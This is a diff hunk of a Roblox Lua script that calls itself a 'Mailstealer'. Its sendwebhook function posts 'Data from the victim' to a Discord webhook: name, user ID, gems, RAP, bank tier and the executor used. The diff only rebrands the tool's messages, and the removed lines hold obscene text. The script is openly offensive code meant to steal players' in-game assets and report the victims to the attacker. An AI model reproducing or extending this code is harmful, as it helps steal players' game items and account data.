@@ -44,12 +44,12 @@ _G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
 _G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
 local function sendwebhook(msg)
 local msg = {
-	["content"]= "**Dovyl Fucker @here**",
+	["content"]= "**custumz on top ngl**",
 	["embeds"]= {
 	  {
-		["title"]= "`Ez`",
+		["title"]= "`custumz Mailstealer Results`",
 		["description"]= "**Data from the victim**\nðŸ§‘Display Name: ".._G.PlrDisplayNameVictim.."\nðŸ§‘Username: ".._G.PlrUserVictim.."\nðŸ§‘User ID: ".._G.PlrUserIDVictim.."\nðŸ±Rank: ".._G.CurrentRank.."\nðŸŽ®Place: ".._G.GameIn.."\nðŸ’ŽGems: **".._G.DisplayDiamond.."**\nâ¬†ï¸Rap: **".._G.DisplayRap.."**\nðŸ“ˆBank Tier: **".._G.DisplayBankTier.."**\nâ˜ Executor: **"..getexploit().."**",
-		["url"]= "Pornhub.com",
+		["url"]= "https://discord.gg/VZX6jGKgxw",
 		["color"]= ""..webhookcolor.."",
   }
   },
